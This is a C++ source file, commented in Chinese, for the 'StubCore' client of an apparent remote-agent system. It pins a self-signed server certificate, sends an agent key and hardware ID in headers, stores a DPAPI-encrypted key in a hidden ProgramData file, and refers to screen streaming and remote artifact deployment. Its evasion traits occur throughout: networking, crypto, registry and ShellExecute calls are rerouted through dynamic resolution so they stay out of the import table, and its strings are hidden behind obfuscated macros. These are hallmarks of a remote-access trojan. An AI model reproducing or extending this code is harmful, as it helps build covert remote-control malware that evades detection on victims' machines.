#include "StubCore.h"
#include "SelfGuard.h"
#include "ArtifactApply.h"   // 工件落地后的"应用"分发（含备份/回滚）
#include <bcrypt.h>   // BCryptGenRandom：工件密钥用系统 CSPRNG 生成
#include "Logger.h"
#include "NetworkFix.h"
#include "IntegrityCheck.h"
#include "Json.h"
#include <map>
#include <vector>
#include <wininet.h>
#include <wincrypt.h>
#include <sstream>
#include <filesystem>
#include <algorithm>
#include <cctype>
#include <cstring>
#include <fstream>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

// ═══════════════════════════════════════════════════════════════════════════
// 兼容性适配：把本文件里的敏感 API 调用**改接到动态解析封装**（Compat 的 ev::Ev*）
//
// 为什么用别名而不是逐个改调用点：
//   本文件有上百处调用，逐个改容易漏；别名能保证"一处生效、语义不变"，
//   并且事后可以用 tools/verify_compat.py 的导入表判据客观验证是否真的
//   不再静态导入 wininet/crypt32/shell32。
// 代价：形参表必须与原始签名逐字一致（已在 EvAdapters.inc 里校准）。
// ═══════════════════════════════════════════════════════════════════════════
#include "Compat.h"
#include <tlhelp32.h>   // CreateToolhelp32Snapshot/PROCESSENTRY32W（投放前按映像名终止旧实例）

// 本机是否以管理员（高完整性）令牌运行。
// 不报这个的话，策略/服务/计划任务类操作会静默失败，运维只能猜。
static bool IsRunningElevatedLocal() {
    BOOL admin = FALSE;
    PSID grp = nullptr;
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&nt, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &grp)) {
        CheckTokenMembership(nullptr, grp, &admin);
        FreeSid(grp);
    }
    return admin != FALSE;
}

#define InternetOpenA        ::EvInternetOpenA
#define InternetConnectA     ::EvInternetConnectA
#define HttpOpenRequestA     ::EvHttpOpenRequestA
#define HttpSendRequestA     ::EvHttpSendRequestA
#define HttpQueryInfoA       ::EvHttpQueryInfoA
#define InternetReadFile     ::EvInternetReadFile
#define InternetCloseHandle  ::EvInternetCloseHandle
#define InternetSetOptionA   ::EvInternetSetOptionA
#define InternetQueryOptionA ::EvInternetQueryOptionA
#define InternetCrackUrlA    ::EvInternetCrackUrlA
#define CryptProtectData     ::EvCryptProtectData
#define CryptUnprotectData   ::EvCryptUnprotectData
#define CryptAcquireContextW ::EvCryptAcquireContextW
#define CryptCreateHash      ::EvCryptCreateHash
#define CryptHashData        ::EvCryptHashData
#define CryptGetHashParam    ::EvCryptGetHashParam
#define CryptDestroyHash     ::EvCryptDestroyHash
#define CryptReleaseContext  ::EvCryptReleaseContext
#define CryptGenRandom       ::EvCryptGenRandom
#define CertFreeCertificateChain ::EvCertFreeCertificateChain
#define RegOpenKeyExW        ::EvRegOpenKeyExW
#define RegQueryValueExW     ::EvRegQueryValueExW
#define RegCloseKey          ::EvRegCloseKey
#define ShellExecuteExW      ::EvShellExecuteExW


// ═══════════════════════════════════════════════
// Stub 核心 — TLS 加密网络客户端 + MCP 进程转发
// ═══════════════════════════════════════════════

// ── TLS 证书标识固定（pinning）──
// 服务端启动日志会打印 "证书 SHA-256 标识"（64 个 hex 字符）。
// 换用新服务器/重新生成证书时，将新标识整串粘贴到下面常量并重新编译。
// 注意：直接粘贴 hex 字符串，运行时逐字符比对 ——
// 不要手工转成字节数组（历史上手抄错位导致全员连接失败）。
//
// 本仓库提交的是**全零占位符**，含义是"尚未配置"：IsPinConfigured() 返回 false，
// VerifyServerCertPin() 随即拒绝连接（fail-closed —— 宁可连不上，也不静默接受未校验证书）。
// 所以 clone 后必须替换，否则客户端不会连上任何服务端。取标识的方式：
//     openssl x509 -in server.crt -noout -fingerprint -sha256 | tr -d ':' | sed 's/.*=//'
//   （服务端首次启动也会把标识打印到日志）
// 比对大小写不敏感（_stricmp）：openssl 默认输出大写、摘要按小写生成，两者混用不会失败。
static const char* PINNED_CERT_SHA256_HEX =
    R6M_STR_68497138CF038825;

// ── 运行期覆盖（2026-10-07 新增）──
// 优先级：环境变量 R6M_CERT_PIN > r6m.ini 的 cert_pin= > 上面的编译期内嵌值。
// 动机：内嵌标识一旦与服务端实际证书不符，客户端会以"疑似中间人"拒绝连接，
// 而重新生成服务端证书（例如为了换掉可识别的主体名 CN=r6m-server）必然改变标识。
// 把标识固定在编译期意味着每次换证书都要重编重发全部客户端 —— 不现实。
//
// 这不是新增暴露面：r6m.ini 里的 server= 由同一个文件控制，能改它的人已经能把
// 客户端指向任意服务器。内嵌值仍是默认，未设 ini/env 时行为与原来完全一致。
static char g_pinOverride[65] = { 0 };

// 当前生效的标识（覆盖值优先）
static const char* ActivePin() {
    return g_pinOverride[0] ? g_pinOverride : PINNED_CERT_SHA256_HEX;
}

// 设置覆盖值：必须恰好 64 个 hex 字符，否则**静默忽略**
// （把非法值当配置会让客户端拒绝一切连接，与"未配置"难以区分）
static bool SetPinOverride(const char* v) {
    if (!v) return false;
    size_t n = strlen(v);
    if (n != 64) return false;
    for (size_t i = 0; i < n; i++) {
        char c = v[i];
        bool hex = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
        if (!hex) return false;
    }
    memcpy(g_pinOverride, v, 64);
    g_pinOverride[64] = 0;
    return true;
}

// 校验 hex 字符串格式合法且非全零
static bool IsPinConfigured() {
    if (strlen(ActivePin()) != 64) return false;
    bool any = false;
    for (const char* p = ActivePin(); *p; p++) {
        char c = *p;
        bool ok = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
        if (!ok) return false;
        if (c != '0') any = true;
    }
    return any;
}

// 校验服务器证书 DER 编码的 SHA-256 是否与固定标识一致
static bool VerifyServerCertPin(HINTERNET hReq) {
    if (!IsPinConfigured()) {
        LOG_E(R6M_STR_6CA00F19E1CA8DEA, "未配置 PINNED_CERT_SHA256 标识，拒绝连接（请从服务端日志获取标识并编译进客户端）");
        return false;
    }
    // 文档化接口：取服务器证书链（INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT = 105）
    PCCERT_CHAIN_CONTEXT pChain = nullptr;
    DWORD sz = sizeof(pChain);
    if (!InternetQueryOptionA(hReq, INTERNET_OPTION_SERVER_CERT_CHAIN_CONTEXT, &pChain, &sz)
        || !pChain || pChain->cChain < 1 || !pChain->rgpChain[0]
        || pChain->rgpChain[0]->cElement < 1 || !pChain->rgpChain[0]->rgpElement[0]) {
        LOG_E(R6M_STR_6CA00F19E1CA8DEA, "无法获取服务器证书链");
        return false;
    }
    // 叶子证书（链首元素）即服务器本证书
    PCCERT_CONTEXT pCert = pChain->rgpChain[0]->rgpElement[0]->pCertContext;
    if (!pCert) {
        LOG_E(R6M_STR_6CA00F19E1CA8DEA, "证书链中无叶子证书");
        CertFreeCertificateChain(pChain);
        return false;
    }
    bool ok = false;
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    // 拆成逐步判定 + 带 GetLastError。
    // 原因：原来写成一条 && 链，任何一步失败都只报一句"证书哈希计算失败"，
    // 无法区分"CSP 拿不到 / 建 hash 失败 / 喂数据失败"，实测端到端时卡在这里
    // 只能靠猜（本机实测确实是这一串失败，逐段加错误码后才定位）。
    if (!CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        LOG_E(R6M_STR_6CA00F19E1CA8DEA, ("CryptAcquireContextW 失败 err=" + std::to_string(GetLastError())).c_str());
    } else if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        LOG_E(R6M_STR_6CA00F19E1CA8DEA, ("CryptCreateHash 失败 err=" + std::to_string(GetLastError())).c_str());
    } else if (!CryptHashData(hHash, pCert->pbCertEncoded, pCert->cbCertEncoded, 0)) {
        LOG_E(R6M_STR_6CA00F19E1CA8DEA, ("CryptHashData 失败 err=" + std::to_string(GetLastError())).c_str());
    } else {
        unsigned char digest[32];
        DWORD dlen = sizeof(digest);
        if (CryptGetHashParam(hHash, HP_HASHVAL, digest, &dlen, 0)) {
            // digest 转 hex 字符串后与 pin 字符串逐字符比对（杜绝手抄字节错位）
            //
            // 2026-10-07 修复：此处原为 strcmp（区分大小写），而本函数用 "%02x" 生成小写，
            // 服务器日志/openssl 打印的却是大写（openssl x509 -fingerprint 默认大写）。
            // 于是"按文档从服务端复制标识填进来"必然得到 got=小写 / want=大写 的不匹配，
            // 客户端会以"疑似中间人"为由拒绝连接，且错误信息里两串看起来完全一样，
            // 极难排查（实测：三处 TCP 连接全部 ESTABLISHED，唯独卡在这一行）。
            // 标识是十六进制，大小写无信息量差异，故改为大小写不敏感比较。
            char got[65];
            for (int i = 0; i < 32; i++) snprintf(got + i * 2, 3, "%02x", digest[i]);
            got[64] = 0;
            ok = (dlen == 32) && (_stricmp(got, ActivePin()) == 0);
            if (!ok) {
                LOG_E(R6M_STR_6CA00F19E1CA8DEA, ("证书标识不匹配！got=" + std::string(got) + " want=" + std::string(ActivePin())).c_str());
            }
        } else {
            LOG_E(R6M_STR_6CA00F19E1CA8DEA, ("CryptGetHashParam 失败 err=" + std::to_string(GetLastError())).c_str());
        }
    }
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    CertFreeCertificateChain(pChain); // 释放整链（pCert 由链持有，不能单独 Free）
    if (!ok) LOG_E(R6M_STR_6CA00F19E1CA8DEA, "证书标识校验失败，断开连接（疑似中间人）");
    return ok;
}

// https 请求：临时授权自签 CA（信任由 pinning 把关，而非系统信任链）
static void SetupSelfSignedTls(HINTERNET hReq) {
    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                   | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                   | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    InternetSetOptionA(hReq, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
}

// 校验来自服务端的文件/目录名：白名单字符集，拒绝路径穿越与命令集成载荷
// 允许: 字母 数字 . _ - 空格 / \（目录分隔）
// 拒绝: 引号、分号、&、|、%、$、..、盘符冒号
// 目标目录的校验**必须与裸文件名分开**。
// 原实现在 deploy 里复用了 IsValidRemoteName，而那个函数是为"裸文件名"写的：
// 它不接受 ':'（因为要防 '\\Windows\\System32' 这种前导分隔符兼容处理成当前盘根）。
// 日志里只留一行"非法目标目录"，很容易被误判成"命令没生效"。
// 这里允许盘符与空格，但依旧禁 '..'、前导分隔符和非法字符。
static bool IsValidTargetDir(const std::string& dir) {
    if (dir.empty() || dir.size() > 200) return false;
    if (dir.find("..") != std::string::npos) return false;
    if (dir[0] == '\\' || dir[0] == '/') return false;   // 前导分隔符 = 当前盘根
    for (size_t i = 0; i < dir.size(); i++) {
        unsigned char c = (unsigned char)dir[i];
        if (c == ':' || c == '\\' || c == '/' || c == ' ' || c == '_' || c == '-' || c == '.')
            continue;
        if (isalnum(c)) continue;
        return false;
    }
    return true;
}

static bool IsValidRemoteName(const std::string& name) {
    if (name.empty() || name.size() > 200) return false;
    if (name.find("..") != std::string::npos) return false;
    // 前导分隔符：'\Windows\System32' 会被解析成当前盘根，等于允许写任意位置
    if (name[0] == '\\' || name[0] == '/') return false;
    // 尾部点/空格在 Windows 上会被静默剥离，导致"校验的名字"与"实际落盘的名字"不同
    char last = name[name.size() - 1];
    if (last == '.' || last == ' ') return false;
    for (size_t i = 0; i < name.size(); i++) {
        char c = name[i];
        bool ok = (isalnum((unsigned char)c) || c == '.' || c == '_' || c == '-' ||
                   c == '/' || c == '\\' || c == ' ');
        if (!ok) return false;
    }
    // 保留设备名：CON/PRN/AUX/NUL/COM1-9/LPT1-9（含带扩展名形式，如 CON.txt）
    std::string base = name;
    size_t slash = base.find_last_of("/\\");
    if (slash != std::string::npos) base = base.substr(slash + 1);
    size_t dot = base.find('.');
    std::string stem = (dot == std::string::npos) ? base : base.substr(0, dot);
    for (size_t i = 0; i < stem.size(); i++) stem[i] = (char)toupper((unsigned char)stem[i]);
    if (stem == "CON" || stem == "PRN" || stem == "AUX" || stem == "NUL") return false;
    if (stem.size() == 4 && (stem.compare(0, 3, "COM") == 0 || stem.compare(0, 3, "LPT") == 0) &&
        stem[3] >= '1' && stem[3] <= '9') {
        return false;
    }
    return true;
}

// ── 基础设施辅助 ──────────────────────────────────────────────

static std::string Utf8FromWide(const std::wstring& ws) {
    if (ws.empty()) return std::string();
    int len = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), nullptr, 0, nullptr, nullptr);
    if (len <= 0) return std::string();
    std::string out((size_t)len, '\0');
    WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), &out[0], len, nullptr, nullptr);
    return out;
}

static std::wstring WideFromUtf8(const std::string& s) {
    if (s.empty()) return std::wstring();
    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
    if (len <= 0) return std::wstring();
    std::wstring out((size_t)len, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &out[0], len);
    return out;
}

static std::string Sha256Hex(const std::string& data) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    std::string out;
    if (!CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return out;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) { CryptReleaseContext(hProv, 0); return out; }
    if (CryptHashData(hHash, (const BYTE*)data.data(), (DWORD)data.size(), 0)) {
        BYTE digest[32] = {};
        DWORD dlen = sizeof(digest);
        if (CryptGetHashParam(hHash, HP_HASHVAL, digest, &dlen, 0) && dlen == 32) {
            char buf[65] = {};
            for (int i = 0; i < 32; i++) snprintf(buf + i * 2, 3, "%02x", digest[i]);
            out.assign(buf, 64);
        }
    }
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return out;
}

static std::string ReadRegString(HKEY root, const wchar_t* subkey, const wchar_t* value) {
    HKEY hKey = nullptr;
    if (RegOpenKeyExW(root, subkey, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS) return std::string();
    wchar_t buf[512] = {};
    DWORD cb = sizeof(buf) - sizeof(wchar_t);
    DWORD type = 0;
    LSTATUS st = RegQueryValueExW(hKey, value, nullptr, &type, (LPBYTE)buf, &cb);
    RegCloseKey(hKey);
    if (st != ERROR_SUCCESS || (type != REG_SZ && type != REG_EXPAND_SZ)) return std::string();
    return Utf8FromWide(buf);
}

// per-agent 密钥自启动配置位置：%ProgramData%\RemoteIPv6Manager\agent.key
// 内容用 DPAPI 机器范围加密（CryptProtectData），替换 r6m.ini 里的引导密钥长期使用。
static std::wstring AgentKeyStorePath() {
    wchar_t programData[MAX_PATH] = {};
    DWORD n = GetEnvironmentVariableW(L"ProgramData", programData, MAX_PATH);
    std::wstring dir = (n > 0 && n < MAX_PATH) ? std::wstring(programData) : std::wstring(L"C:\\ProgramData");
    dir += std::wstring(::r6m::ev::Widen(R6M_STR_B6EF0ADC074CB68B));
    CreateDirectoryW(dir.c_str(), nullptr);
    return dir + L"\\agent.key";
}

static bool DpapiProtect(const std::string& plain, std::vector<BYTE>& out) {
    DATA_BLOB in = { (DWORD)plain.size(), (BYTE*)plain.data() };
    DATA_BLOB enc = {};
    if (!CryptProtectData(&in, L"r6m-agent-key", nullptr, nullptr, nullptr,
                          CRYPTPROTECT_LOCAL_MACHINE, &enc)) return false;
    out.assign(enc.pbData, enc.pbData + enc.cbData);
    LocalFree(enc.pbData);
    return true;
}

static bool DpapiUnprotect(const std::vector<BYTE>& enc, std::string& plain) {
    if (enc.empty()) return false;
    DATA_BLOB in = { (DWORD)enc.size(), (BYTE*)enc.data() };
    DATA_BLOB dec = {};
    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, CRYPTPROTECT_LOCAL_MACHINE, &dec)) return false;
    plain.assign((const char*)dec.pbData, dec.cbData);
    LocalFree(dec.pbData);
    return true;
}

// ── 密钥内存卫生（方案1）──
// 存放：明文 key 与随机 mask 异或后保存，两成员长驻但均无明文特征
void StubCore::setAgentKeyPlain(const char* key) {
    if (!_agentKeyObf.empty()) SecureZeroMemory(&_agentKeyObf[0], _agentKeyObf.size());
    if (!_keyMask.empty()) SecureZeroMemory(&_keyMask[0], _keyMask.size());
    _agentKeyObf.clear();
    _keyMask.clear();
    if (!key || !*key) return;
    size_t len = strlen(key);
    _agentKeyObf.resize(len);
    _keyMask.resize(len);
    // 生成随机掩码（BCryptGenRandom 不可用则退化为简单熵源）
    HCRYPTPROV hProv = 0;
    bool haveCsp = CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) != 0;
    for (size_t i = 0; i < len; i++) {
        unsigned char r = 0;
        if (haveCsp) {
            BYTE b = 0;
            if (!CryptGenRandom(hProv, 1, &b)) b = (BYTE)(GetTickCount() ^ i);
            r = b;
        } else {
            r = (BYTE)(GetTickCount() ^ (i * 131));
        }
        _keyMask[i] = r;
        _agentKeyObf[i] = key[i] ^ r;
    }
    if (haveCsp) CryptReleaseContext(hProv, 0);
}

// 在栈上构造 "X-Agent-Key: <key>\r\n" + "X-Agent-HWID: <hwid>\r\n" 头，
// 用后由调用方 SecureZeroMemory。
// 返回的 std::string 内容即含明文——调用方必须在发送完成后立即 wipe。
static std::string BuildAgentKeyHeader(const std::string& obf, const std::string& mask,
                                       const std::string& hwid) {
    std::string hdr;
    if (obf.empty()) return hdr;
    hdr.reserve(obf.size() + hwid.size() + 48);
    hdr += R6M_STR_BDCA9E253A30B75B;
    for (size_t i = 0; i < obf.size(); i++) hdr += (char)(obf[i] ^ mask[i]);
    hdr += "\r\n";
    if (!hwid.empty()) hdr += R6M_STR_4D8B2478F766D2CC + hwid + "\r\n";
    return hdr;
}

static void WipeString(std::string& s) {
    if (!s.empty()) {
        SecureZeroMemory(&s[0], s.size());
    }
    s.clear();
}

StubCore::StubCore() {
    LOG_I(R6M_STR_D9CF61251F402ED5, "Constructor start");
    // 配置优先级：命令行参数 > 环境变量 > exe 同目录 r6m.ini
    // r6m.ini 格式（UTF-8，无 BOM）：
    //   server=https://[v6地址]:8443
    //   agent_key=64位hex引导密钥
//   cert_pin=64位hex证书标识（可选；覆盖编译期内嵌值，用于服务端换证书后免重编）
    _serverUrl = R6M_STR_CE7E4706D8BDC3FD;

    // 1) 环境变量
    if (const char* s = getenv("R6M_SERVER")) _serverUrl = s;
    if (const char* k = getenv("R6M_AGENT_KEY")) setAgentKeyPlain(k);
    // 证书标识覆盖（见 ActivePin 的说明）
    if (const char* p = getenv("R6M_CERT_PIN")) {
        if (SetPinOverride(p)) {
            LOG_I(R6M_STR_D9CF61251F402ED5, "已从环境变量 R6M_CERT_PIN 载入证书标识覆盖值");
        } else {
            LOG_E(R6M_STR_D9CF61251F402ED5, "R6M_CERT_PIN 不是 64 位 hex，已忽略（将使用编译期内嵌值）");
        }
    }

    // 2) 配置文件兜底（环境变量未设置，或 pin 尚未被环境变量覆盖时）
    if (getenv("R6M_SERVER") == nullptr || getenv("R6M_AGENT_KEY") == nullptr
        || g_pinOverride[0] == 0) {
        wchar_t exePath[MAX_PATH] = {};
        GetModuleFileNameW(nullptr, exePath, MAX_PATH);
        std::wstring ws(exePath);
        ws = ws.substr(0, ws.find_last_of(L'\\'));
        std::ifstream ini(ws + ::r6m::ev::Widen(R6M_STR_97F0888C33986592));
        if (ini.is_open()) {
            std::string line;
            while (std::getline(ini, line)) {
                // 去掉 \r 和首尾空格
                while (!line.empty() && (line.back() == '\r' || line.back() == ' ')) line.pop_back();
                auto eq = line.find('=');
                if (eq == std::string::npos) continue;
                std::string key = line.substr(0, eq), val = line.substr(eq + 1);
                if (key == "server" && getenv("R6M_SERVER") == nullptr && !val.empty()) {
                    _serverUrl = val;
                    LOG_I(R6M_STR_D9CF61251F402ED5, R6M_STR_7AAEE00AC3AB724E);
                } else if (key == "cert_pin" && g_pinOverride[0] == 0 && !val.empty()) {
                    if (SetPinOverride(val.c_str())) {
                        LOG_I(R6M_STR_D9CF61251F402ED5, "已从 r6m.ini 载入证书标识覆盖值");
                    } else {
                        LOG_E(R6M_STR_D9CF61251F402ED5, "r6m.ini 的 cert_pin 不是 64 位 hex，已忽略");
                    }
                } else if (key == R6M_STR_6280952B223463RMM && !hasAgentKey() && !val.empty()) {
                    setAgentKeyPlain(val.c_str());
                    SecureZeroMemory(&val[0], val.size());
                    LOG_I(R6M_STR_D9CF61251F402ED5, R6M_STR_606E477010F4089E);
                }
            }
        }
    }

    // 引导密钥留一份副本：自启动配置密钥失效（服务端换了/被吊销）时要能回退
    rememberBootstrapKey();
    if (loadPersistedAgentKey()) {
        LOG_I(R6M_STR_D9CF61251F402ED5, "已装入本机自启动配置 per-agent 密钥（无需再用引导密钥登记）");
    }

    LOG_I(R6M_STR_D9CF61251F402ED5, "Setting up HTTP session...");
    _hSession = InternetOpenA(R6M_STR_E135538C723B5E39, INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
    if (_hSession) {
        LOG_I(R6M_STR_D9CF61251F402ED5, "HTTP session OK");
    } else {
        LOG_E(R6M_STR_D9CF61251F402ED5, "HTTP session FAILED");
    }
    if (!hasAgentKey()) {
        LOG_E(R6M_STR_D9CF61251F402ED5, R6M_STR_AC89B1F7DFC12396);
    }
    LOG_I(R6M_STR_D9CF61251F402ED5, "Constructor done");
}

StubCore::~StubCore() {
    _running = false;
    // 先停采集线程再关 HTTP 会话：否则采集线程可能正握着 _hSession 发帧，
    // 会话被关掉后它会拿到无效句柄（表现为退出时偶发崩溃/卡顿）。
    stopScreenStream();
    if (_heartbeatThread.joinable()) _heartbeatThread.join();
    if (_hSession) InternetCloseHandle(_hSession);
}

// ── HTTP ──

bool StubCore::httpRequest(const char* method, const std::string& path, const std::string& body,
                           bool withCredentials, std::string& response) {
    response.clear();

    // 明文 HTTP 直接拒绝：密钥、指令、文件内容全部裸奔，没有任何"降级可用"的余地
    if (_serverUrl.compare(0, 8, R6M_STR_C36051FD1B91173E) != 0) {
        LOG_E(R6M_STR_C977E4D8B5615805, R6M_STR_08BDCB8D79E0A225);
        return false;
    }

    std::string url = _serverUrl + path;
    LOG_D(R6M_STR_C977E4D8B5615805, ((std::string(method) + " " + url).c_str()));

    URL_COMPONENTS urlComp = {};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = 1;
    urlComp.dwHostNameLength = 1;
    urlComp.dwUrlPathLength = 1;
    urlComp.dwExtraInfoLength = 1;

    if (!InternetCrackUrlA(url.c_str(), (DWORD)url.size(), 0, &urlComp)) {
        LOG_E(R6M_STR_C977E4D8B5615805, "URL parse failed");
        return false;
    }
    std::string host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::string pathStr(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);
    if (urlComp.dwExtraInfoLength > 0) {
        pathStr += std::string(urlComp.lpszExtraInfo, urlComp.dwExtraInfoLength);
    }
    int port = urlComp.nPort;
    bool isHttps = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);

    LOG_D(R6M_STR_C977E4D8B5615805, ("Host: " + host + " Port: " + std::to_string(port) + (isHttps ? " (TLS)" : "")).c_str());

    HINTERNET hConn = InternetConnectA(_hSession, host.c_str(), (INTERNET_PORT)port,
        nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) {
        LOG_E(R6M_STR_C977E4D8B5615805, "InternetConnect failed");
        return false;
    }

    DWORD reqFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI;
    if (isHttps) reqFlags |= INTERNET_FLAG_SECURE;

    HINTERNET hReq = HttpOpenRequestA(hConn, method, pathStr.c_str(), nullptr, nullptr,
        nullptr, reqFlags, 0);
    if (!hReq) {
        LOG_E(R6M_STR_C977E4D8B5615805, "HttpOpenRequest failed");
        InternetCloseHandle(hConn);
        return false;
    }

    if (isHttps) SetupSelfSignedTls(hReq);

    DWORD timeout = 30000;
    InternetSetOption(hReq, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    InternetSetOption(hReq, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));

    std::string headers;
    if (!body.empty()) headers += R6M_STR_9059B59BBE04E875;
    if (withCredentials) {
        std::string keyHdr = BuildAgentKeyHeader(_agentKeyObf, _keyMask, _hwid);
        headers += keyHdr;
        WipeString(keyHdr);
    }
    if (!HttpSendRequestA(hReq, headers.empty() ? nullptr : headers.c_str(), (DWORD)headers.size(),
                          body.empty() ? nullptr : (LPVOID)body.c_str(), (DWORD)body.size())) {
        LOG_E(R6M_STR_C977E4D8B5615805, "HttpSendRequestA failed");
        WipeString(headers);
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }
    WipeString(headers); // 含密钥明文，发送后立即擦

    // 标识复核（纵深防御）。注意：真正的保护在 probeAndVerifyPin()——
    // 凭据只在探测通过之后才可能被发出去，所以中间人拿不到密钥。
    if (isHttps && !VerifyServerCertPin(hReq)) {
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        return false;
    }

    char buf[65536];
    DWORD bytesRead = 0;
    std::string result;
    while (InternetReadFile(hReq, buf, sizeof(buf) - 1, &bytesRead) && bytesRead > 0) {
        buf[bytesRead] = 0;
        result += buf;
    }
    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    response = result;
    LOG_D(R6M_STR_C977E4D8B5615805, ("Response: " + result.substr(0, 100)).c_str());
    return true;
}

bool StubCore::httpPost(const std::string& path, const std::string& body, std::string& response) {
    return httpRequest("POST", path, body, true, response);
}

std::string StubCore::httpGet(const std::string& path) {
    std::string resp;
    httpRequest("GET", path, std::string(), true, resp);
    return resp;
}

// 两阶段连接的关键第一步：不带任何凭据请求 /api/health，
// 此时过网的只有一次 TLS 握手与一个无敏感信息的 GET。
bool StubCore::probeAndVerifyPin() {
    if (!IsPinConfigured()) {
        LOG_E(R6M_STR_6CA00F19E1CA8DEA, "未配置 PINNED_CERT_SHA256 标识，拒绝连接");
        return false;
    }
    std::string resp;
    if (!httpRequest("GET", R6M_STR_34EAF5612865B119, std::string(), false, resp)) {
        LOG_W(R6M_STR_6CA00F19E1CA8DEA, "无凭据探测失败（网络不可达或证书标识不匹配）");
        return false;
    }
    r6m::Json j;
    std::string err;
    if (!r6m::Json::parse(resp, j, &err) || !j.getBool("ok", false)) {
        LOG_E(R6M_STR_6CA00F19E1CA8DEA, ("探测响应异常，拒绝继续: " + resp.substr(0, 120)).c_str());
        return false;
    }
    LOG_I(R6M_STR_6CA00F19E1CA8DEA, "标识校验通过（凭据尚未发送）");
    return true;
}

// ── per-agent 密钥自启动配置（DPAPI 机器范围）──
bool StubCore::loadPersistedAgentKey() {
    std::wstring path = AgentKeyStorePath();
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD size = GetFileSize(h, nullptr);
    if (size == INVALID_FILE_SIZE || size == 0 || size > 8192) { CloseHandle(h); return false; }
    std::vector<BYTE> enc(size);
    DWORD got = 0;
    BOOL ok = ReadFile(h, enc.data(), size, &got, nullptr);
    CloseHandle(h);
    if (!ok || got != size) return false;
    std::string plain;
    if (!DpapiUnprotect(enc, plain) || plain.empty()) {
        LOG_W(R6M_STR_D9CF61251F402ED5, "自启动配置密钥解密失败（换了机器/用户？），将回退引导密钥重新登记");
        return false;
    }
    setAgentKeyPlain(plain.c_str());
    SecureZeroMemory(&plain[0], plain.size());
    return true;
}

void StubCore::persistAgentKey(const std::string& key) {
    std::vector<BYTE> enc;
    if (!DpapiProtect(key, enc)) {
        LOG_W(R6M_STR_D9CF61251F402ED5, "DPAPI 加密失败，密钥无法自启动配置（重启后需重新登记）");
        return;
    }
    std::wstring path = AgentKeyStorePath();
    HANDLE h = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_HIDDEN, nullptr);
    if (h == INVALID_HANDLE_VALUE) {
        LOG_W(R6M_STR_D9CF61251F402ED5, ("无法写入自启动配置密钥（err=" + std::to_string(GetLastError()) + "）").c_str());
        return;
    }
    DWORD written = 0;
    WriteFile(h, enc.data(), (DWORD)enc.size(), &written, nullptr);
    CloseHandle(h);
    LOG_I(R6M_STR_D9CF61251F402ED5, "per-agent 密钥已自启动配置（DPAPI 机器范围）");
}

void StubCore::rememberBootstrapKey() {
    _bootstrapKeyObf = _agentKeyObf;
    _bootstrapKeyMask = _keyMask;
}

void StubCore::clearFuse(const char* why) {
    _integrityCompromised = false;
    _consecutiveOkChecks = 0;
    LOG_W(R6M_STR_D9CF61251F402ED5, (std::string("完整性安全隔离已解除（") + why + "），恢复指令执行").c_str());
}

// ── 主循环 ──


void StubCore::run(const std::wstring& pluginDir) {
    _running = true;
    LOG_INFO(R6M_STR_D9CF61251F402ED5, "=== START ===");

    // Parse command line
    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    for (int i = 1; i < argc; i++) {
        if (std::wstring(argv[i]) == L"--server" && i + 1 < argc) {
            std::wstring ws(argv[i + 1]);
            _serverUrl = std::string(ws.begin(), ws.end());
        }
        if (std::wstring(argv[i]) == L"--agent-key") {
            // 已移除：命令行对同机任何进程可读（WMI/任务管理器/EDR 日志），
